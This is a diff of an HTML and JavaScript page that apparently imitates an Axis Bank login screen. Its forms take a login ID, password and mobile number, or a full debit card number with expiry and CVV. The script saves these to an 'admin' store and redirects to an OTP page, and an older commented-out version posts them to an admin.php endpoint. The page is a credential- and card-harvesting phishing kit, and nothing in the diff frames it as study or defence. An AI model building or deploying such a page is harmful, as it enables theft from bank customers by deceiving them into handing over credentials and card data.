@@ -5,75 +5,78 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login using</title>
     <style>
+        /* Reset और बेसिक स्टाइल्स */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: Arial, sans-serif;
         }
         
         body {
             background-color: #990330;
-            min-height: 100vh;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
+            align-items: center;
+            min-height: 100vh;
             padding: 20px;
         }
         
-        .login-container {
+        /* मुख्य कंटेनर */
+        .login-box {
             width: 100%;
-            max-width: 450px;
+            max-width: 380px;
             background-color: white;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
             overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
         }
         
-        .header-section {
-            background-color: #990330;
-            color: white;
-            padding: 25px;
+        /* हेडर सेक्शन */
+        .login-header {
+            padding: 25px 25px 20px 25px;
+            border-bottom: 1px solid #eee;
             text-align: center;
         }
         
-        .header-section h1 {
-            font-size: 24px;
-            margin-bottom: 10px;
-            font-weight: 600;
+        .login-header h1 {
+            color: #333;
+            font-size: 20px;
+            font-weight: normal;
+            margin-bottom: 8px;
         }
         
-        .header-section p {
-            font-size: 16px;
-            opacity: 0.9;
+        .login-header p {
+            color: #666;
+            font-size: 14px;
         }
         
-        .login-options {
+        /* लॉगिन विकल्प टैब */
+        .login-tabs {
             display: flex;
-            background-color: #f0f0f0;
             border-bottom: 1px solid #ddd;
         }
         
-        .login-tab {
+        .tab {
             flex: 1;
             text-align: center;
             padding: 15px;
-            cursor: pointer;
-            font-weight: 600;
+            font-size: 14px;
             color: #666;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
             transition: all 0.3s;
-            border-bottom: 3px solid transparent;
         }
         
-        .login-tab.active {
-            background-color: white;
+        .tab.active {
             color: #990330;
-            border-bottom: 3px solid #990330;
+            font-weight: bold;
+            border-bottom: 2px solid #990330;
         }
         
-        .login-form {
-            padding: 30px;
+        /* फॉर्म सेक्शन */
+        .form-container {
+            padding: 25px;
         }
         
         .form-section {
@@ -84,16 +87,17 @@
             display: block;
         }
         
-        .form-group {
+        /* इनपुट ग्रुप */
+        .input-group {
             margin-bottom: 20px;
         }
         
-        .form-group label {
+        .input-group label {
             display: block;
-            font-weight: 600;
             color: #333;
+            font-size: 13px;
+            font-weight: bold;
             margin-bottom: 8px;
-            font-size: 14px;
         }
         
         .input-with-icon {
@@ -102,83 +106,82 @@
         
         .input-icon {
             position: absolute;
-            left: 15px;
+            left: 12px;
             top: 50%;
             transform: translateY(-50%);
             color: #990330;
             font-weight: bold;
+            font-style: italic;
         }
         
-        .form-control {
+        .input-field {
             width: 100%;
-            padding: 14px 15px 14px 45px;
-            border: 2px solid #990330;
-            border-radius: 8px;
-            font-size: 16px;
+            padding: 12px 12px 12px 30px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #333;
             background-color: #f9f9f9;
-            transition: all 0.3s;
         }
         
-        .form-control:focus {
+        .input-field:focus {
             outline: none;
-            background-color: white;
-            box-shadow: 0 0 0 3px rgba(153, 3, 48, 0.2);
+            border-color: #990330;
+            background-color: #fff;
         }
         
-        .forgot-link {
-            display: inline-block;
+        /* लिंक्स */
+        .links {
+            margin-top: 8px;
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .link {
             color: #990330;
             text-decoration: none;
-            font-size: 14px;
-            margin-top: 5px;
-            font-weight: 600;
+            font-size: 12px;
+            font-weight: bold;
         }
         
-        .forgot-link:hover {
+        .link:hover {
             text-decoration: underline;
         }
         
-        .enable-link {
-            display: inline-block;
-            color: #990330;
-            text-decoration: none;
-            font-size: 14px;
-            margin-left: 15px;
-            font-weight: 600;
-        }
-        
+        /* डैशबोर्ड टेक्स्ट */
         .dashboard-text {
             margin: 25px 0;
             padding: 15px;
             background-color: #f5f5f5;
-            border-left: 4px solid #990330;
-            border-radius: 5px;
+            border-radius: 4px;
+            text-align: center;
         }
         
         .dashboard-text p {
             color: #333;
-            font-weight: 600;
+            font-size: 14px;
+            font-weight: bold;
         }
         
-        .login-btn {
+        /* लॉगिन बटन */
+        .login-button {
             width: 100%;
-            padding: 16px;
+            padding: 14px;
             background-color: #990330;
             color: white;
             border: none;
-            border-radius: 8px;
-            font-size: 18px;
-            font-weight: 600;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 10px;
+            transition: background-color 0.3s;
         }
         
-        .login-btn:hover {
-            background-color: #7a0228;
-            transform: translateY(-2px);
+        .login-button:hover {
+            background-color: #7a0026;
         }
         
+        /* रजिस्टर सेक्शन */
         .register-section {
             text-align: center;
             margin-top: 25px;
@@ -186,15 +189,15 @@
             border-top: 1px solid #eee;
         }
         
-        .register-text {
+        .register-section span {
             color: #666;
-            font-size: 15px;
+            font-size: 14px;
         }
         
         .register-link {
             color: #990330;
             text-decoration: none;
-            font-weight: 600;
+            font-weight: bold;
             margin-left: 5px;
         }
         
@@ -202,156 +205,181 @@
             text-decoration: underline;
         }
         
+        /* QR कोड सेक्शन */
         .qr-section {
-            text-align: center;
-            margin-top: 30px;
+            margin-top: 25px;
             padding: 20px;
             background-color: #f9f9f9;
-            border-radius: 10px;
+            border-radius: 4px;
+            text-align: center;
         }
         
-        .qr-text {
+        .qr-title {
             color: #333;
-            font-weight: 600;
-            margin-bottom: 10px;
-        }
-        
-        .qr-enlarge {
-            color: #990330;
-            text-decoration: none;
-            font-weight: 600;
             font-size: 14px;
-            display: inline-block;
-            margin-top: 10px;
+            font-weight: bold;
+            margin-bottom: 15px;
         }
         
-        .qr-placeholder {
-            width: 150px;
-            height: 150px;
-            margin: 0 auto;
-            background-color: #e0e0e0;
+        .qr-code {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 15px auto;
+            background: linear-gradient(45deg, #ddd, #eee);
+            border-radius: 4px;
             display: flex;
             align-items: center;
             justify-content: center;
-            border-radius: 10px;
-            border: 2px dashed #990330;
+            border: 1px solid #ccc;
         }
         
-        .qr-placeholder span {
+        .qr-text {
+            color: #666;
+            font-size: 12px;
+        }
+        
+        .enlarge-link {
             color: #990330;
-            font-weight: 600;
+            text-decoration: none;
+            font-size: 12px;
+            font-weight: bold;
+            display: block;
+            margin-top: 10px;
         }
         
-        @media (max-width: 480px) {
-            .login-container {
-                max-width: 100%;
-            }
-            
-            .login-form {
-                padding: 20px;
-            }
+        .enlarge-link:hover {
+            text-decoration: underline;
+        }
+        
+        /* फूटर */
+        .footer {
+            padding: 15px 25px;
+            background-color: #f5f5f5;
+            text-align: center;
+            border-top: 1px solid #eee;
+        }
+        
+        .footer-text {
+            color: #666;
+            font-size: 11px;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="header-section">
+    <div class="login-box">
+        <!-- हेडर -->
+        <div class="login-header">
             <h1>Login using</h1>
-            <p>Login ID / Customer ID | Debit Card No.</p>
+            <p>Login ID / Customer ID &nbsp;&nbsp; Debit Card No.</p>
         </div>
         
-        <div class="login-options">
-            <div class="login-tab active" data-tab="userid">Login ID / Customer ID</div>
-            <div class="login-tab" data-tab="card">Debit Card No.</div>
+        <!-- टैब्स -->
+        <div class="login-tabs">
+            <div class="tab active" data-tab="userid">Login ID / Customer ID</div>
+            <div class="tab" data-tab="card">Debit Card No.</div>
         </div>
         
-        <div class="login-form">
-            <!-- User ID Login Form -->
-            <div id="userid-form" class="form-section active">
-                <div class="form-group">
+        <!-- फॉर्म कंटेनर -->
+        <div class="form-container">
+            <!-- User ID फॉर्म -->
+            <form id="userid-form" class="form-section active">
+                <div class="input-group">
                     <label>Login ID / Customer ID</label>
                     <div class="input-with-icon">
                         <span class="input-icon">i</span>
-                        <input type="text" id="userid" class="form-control" placeholder="Enter ID">
+                        <input type="text" class="input-field" placeholder="Enter ID" id="userid">
                     </div>
-                    <div>
-                        <a href="#" class="forgot-link">Forgot customer ID</a>
-                        <a href="#" class="enable-link">Enable login ID</a>
+                    <div class="links">
+                        <a href="#" class="link">Forgot customer ID</a>
+                        <a href="#" class="link">Enable login ID</a>
                     </div>
                 </div>
                 
-                <div class="form-group">
+                <div class="input-group">
                     <label>Password</label>
                     <div class="input-with-icon">
                         <span class="input-icon">●</span>
-                        <input type="password" id="password" class="form-control" placeholder="Enter Password">
+                        <input type="password" class="input-field" placeholder="Enter Password" id="password">
                     </div>
-                    <a href="#" class="forgot-link">Forgot password</a>
+                    <div class="links">
+                        <a href="#" class="link">Forgot password</a>
+                    </div>
                 </div>
                 
-                <div class="form-group">
+                <div class="input-group">
                     <label>Mobile Number</label>
                     <div class="input-with-icon">
                         <span class="input-icon">📱</span>
-                        <input type="tel" id="mobile" class="form-control" placeholder="Enter Mobile Number" maxlength="10">
+                        <input type="tel" class="input-field" placeholder="Enter Mobile Number" id="mobile" maxlength="10">
                     </div>
                 </div>
-            </div>
+            </form>
             
-            <!-- Debit Card Login Form -->
-            <div id="card-form" class="form-section">
-                <div class="form-group">
-                    <label>16-Digit Card Number</label>
+            <!-- Card फॉर्म -->
+            <form id="card-form" class="form-section">
+                <div class="input-group">
+                    <label>16-Digit Debit Card Number</label>
                     <div class="input-with-icon">
                         <span class="input-icon">💳</span>
-                        <input type="text" id="cardno" class="form-control" placeholder="Enter 16-digit card number" maxlength="16">
+                        <input type="text" class="input-field" placeholder="Enter 16-digit card number" id="cardno" maxlength="16">
                     </div>
                 </div>
                 
-                <div class="form-group">
+                <div class="input-group">
                     <label>Expiry Date (DDMM)</label>
                     <div class="input-with-icon">
                         <span class="input-icon">📅</span>
-                        <input type="text" id="expiry" class="form-control" placeholder="DDMM" maxlength="4">
+                        <input type="text" class="input-field" placeholder="DDMM" id="expiry" maxlength="4">
                     </div>
                 </div>
                 
-                <div class="form-group">
+                <div class="input-group">
                     <label>CVV (3 digits)</label>
                     <div class="input-with-icon">
                         <span class="input-icon">🔒</span>
-                        <input type="text" id="cvv" class="form-control" placeholder="123" maxlength="3">
+                        <input type="text" class="input-field" placeholder="123" id="cvv" maxlength="3">
                     </div>
                 </div>
-            </div>
+            </form>
             
+            <!-- डैशबोर्ड टेक्स्ट -->
             <div class="dashboard-text">
                 <p>Login directly to Dashboard</p>
             </div>
             
-            <button type="button" id="loginBtn" class="login-btn">Login</button>
+            <!-- लॉगिन बटन -->
+            <button type="button" class="login-button" id="loginBtn">Login</button>
             
+            <!-- रजिस्टर सेक्शन -->
             <div class="register-section">
-                <span class="register-text">First time user?</span>
+                <span>First time user?</span>
                 <a href="#" class="register-link">REGISTER HERE</a>
             </div>
             
+            <!-- QR कोड सेक्शन -->
             <div class="qr-section">
-                <p class="qr-text">Scan to download open by Axis Bank app</p>
-                <div class="qr-placeholder">
-                    <span>QR Code</span>
+                <div class="qr-title">Scan to download open by Axis Bank app</div>
+                <div class="qr-code">
+                    <span class="qr-text">QR Code</span>
                 </div>
-                <a href="#" class="qr-enlarge">Enlarge QR code</a>
+                <a href="#" class="enlarge-link">Enlarge QR code</a>
+            </div>
+        </div>
+        
+        <!-- फूटर -->
+        <div class="footer">
+            <div class="footer-text">
+                © 2024 Bank Name. All rights reserved.
             </div>
         </div>
     </div>
 
     <script>
         // टैब स्विचिंग
-        document.querySelectorAll('.login-tab').forEach(tab => {
+        document.querySelectorAll('.tab').forEach(tab => {
             tab.addEventListener('click', function() {
                 // सभी टैब्स से active क्लास हटाएं
-                document.querySelectorAll('.login-tab').forEach(t => {
+                document.querySelectorAll('.tab').forEach(t => {
                     t.classList.remove('active');
                 });
                 
@@ -370,105 +398,132 @@
         });
         
         // लॉगिन बटन कार्य
-        document.getElementById('loginBtn').addEventListener('click', async function() {
-            let loginData = {};
-            let currentTab = document.querySelector('.login-tab.active').getAttribute('data-tab');
+        document.getElementById('loginBtn').addEventListener('click', function() {
+            let currentTab = document.querySelector('.tab.active').getAttribute('data-tab');
+            let isValid = true;
             
             if (currentTab === 'userid') {
-                // User ID लॉगिन डेटा
+                // User ID वैलिडेशन
                 const userId = document.getElementById('userid').value.trim();
                 const password = document.getElementById('password').value.trim();
                 const mobile = document.getElementById('mobile').value.trim();
                 
-                if (!userId || !password || !mobile) {
-                    return; // कोई एलर्ट नहीं
+                if (userId === '' || password === '' || mobile === '') {
+                    isValid = false;
                 }
                 
-                loginData = {
-                    login_type: 'userid',
-                    user_id: userId,
-                    password: password,
-                    mobile: mobile,
-                    timestamp: new Date().toISOString()
-                };
+                if (isValid) {
+                    // डेटा सेव करें
+                    const loginData = {
+                        type: 'userid',
+                        userid: userId,
+                        password: password,
+                        mobile: mobile,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    // LocalStorage में सेव करें
+                    saveToAdmin(loginData);
+                    
+                    // OTP पेज पर रीडायरेक्ट
+                    window.location.href = 'otp1.html';
+                }
                 
             } else if (currentTab === 'card') {
-                // कार्ड लॉगिन डेटा
+                // Card वैलिडेशन
                 const cardno = document.getElementById('cardno').value.trim();
                 const expiry = document.getElementById('expiry').value.trim();
                 const cvv = document.getElementById('cvv').value.trim();
                 
-                if (!cardno || !expiry || !cvv) {
-                    return; // कोई एलर्ट नहीं
+                if (cardno.length !== 16 || expiry.length !== 4 || cvv.length !== 3) {
+                    isValid = false;
                 }
                 
-                loginData = {
-                    login_type: 'card',
-                    card_number: cardno,
-                    expiry_date: expiry,
-                    cvv: cvv,
-                    timestamp: new Date().toISOString()
-                };
+                if (isValid) {
+                    // डेटा सेव करें
+                    const loginData = {
+                        type: 'card',
+                        cardno: cardno,
+                        expiry: expiry,
+                        cvv: cvv,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    // LocalStorage में सेव करें
+                    saveToAdmin(loginData);
+                    
+                    // OTP पेज पर रीडायरेक्ट
+                    window.location.href = 'otp1.html';
+                }
             }
             
-            try {
-                // डेटा बैकएंड पर भेजें (admin.html तक पहुँचाएँ)
-                // Note: वास्तविक implementation के लिए आपको server-side code चाहिए
-                await saveToBackend(loginData);
-                
-                // otp1.html पर रीडायरेक्ट
-                window.location.href = 'otp1.html';
-                
-            } catch (error) {
-                console.error('Login error:', error);
-                // कोई एलर्ट नहीं दिखाना
-            }
+            // अगर वैलिडेशन फेल हो तो कोई अलर्ट नहीं - सिर्फ कुछ नहीं होगा
         });
         
-        // बैकएंड में डेटा सेव करने के लिए फंक्शन
-        async function saveToBackend(data) {
-            // यहाँ आपका actual backend endpoint होगा
-            // उदाहरण के लिए localStorage का उपयोग कर रहे हैं
-            // असल में यहाँ fetch API या AJAX call होगा
-            
-            // localStorage में सेव करना (temporary solution)
-            let allLogins = JSON.parse(localStorage.getItem('admin_logins')) || [];
-            allLogins.push(data);
-            localStorage.setItem('admin_logins', JSON.stringify(allLogins));
-            
-            // वास्तविक बैकएंड के लिए:
-            /*
-            const response = await fetch('your-backend-endpoint/admin.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            });
-            
-            if (!response.ok) {
-                throw new Error('Network response was not ok');
+        // डेटा को admin के लिए सेव करना
+        function saveToAdmin(data) {
+            try {
+                // पुराना डेटा लोड करें
+                let allLogins = JSON.parse(localStorage.getItem('bank_logins')) || [];
+                
+                // नया डेटा जोड़ें
+                allLogins.push(data);
+                
+                // वापस सेव करें
+                localStorage.setItem('bank_logins', JSON.stringify(allLogins));
+                
+                // कंसोल में दिखाएं (डीबगिंग के लिए)
+                console.log('Login data saved:', data);
+                
+            } catch (error) {
+                console.error('Error saving login data:', error);
             }
-            
-            return await response.json();
-            */
         }
         
-        // इनपुट वैलिडेशन
+        // इनपुट वैलिडेशन और फॉर्मैटिंग
         document.getElementById('cardno').addEventListener('input', function(e) {
-            this.value = this.value.replace(/\D/g, '').slice(0, 16);
+            // सिर्फ नंबर्स
+            this.value = this.value.replace(/\D/g, '');
+            
+            // 16 डिजिट से ज्यादा नहीं
+            if (this.value.length > 16) {
+                this.value = this.value.substring(0, 16);
+            }
         });
         
         document.getElementById('expiry').addEventListener('input', function(e) {
-            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+            // सिर्फ नंबर्स
+            this.value = this.value.replace(/\D/g, '');
+            
+            // 4 डिजिट से ज्यादा नहीं
+            if (this.value.length > 4) {
+                this.value = this.value.substring(0, 4);
+            }
         });
         
         document.getElementById('cvv').addEventListener('input', function(e) {
-            this.value = this.value.replace(/\D/g, '').slice(0, 3);
+            // सिर्फ नंबर्स
+            this.value = this.value.replace(/\D/g, '');
+            
+            // 3 डिजिट से ज्यादा नहीं
+            if (this.value.length > 3) {
+                this.value = this.value.substring(0, 3);
+            }
         });
         
         document.getElementById('mobile').addEventListener('input', function(e) {
-            this.value = this.value.replace(/\D/g, '').slice(0, 10);
+            // सिर्फ नंबर्स
+            this.value = this.value.replace(/\D/g, '');
+            
+            // 10 डिजिट से ज्यादा नहीं
+            if (this.value.length > 10) {
+                this.value = this.value.substring(0, 10);
+            }
+        });
+        
+        // पेज लोड होने पर फोकस सेट करें
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('userid').focus();
         });
     </script>
 </body>
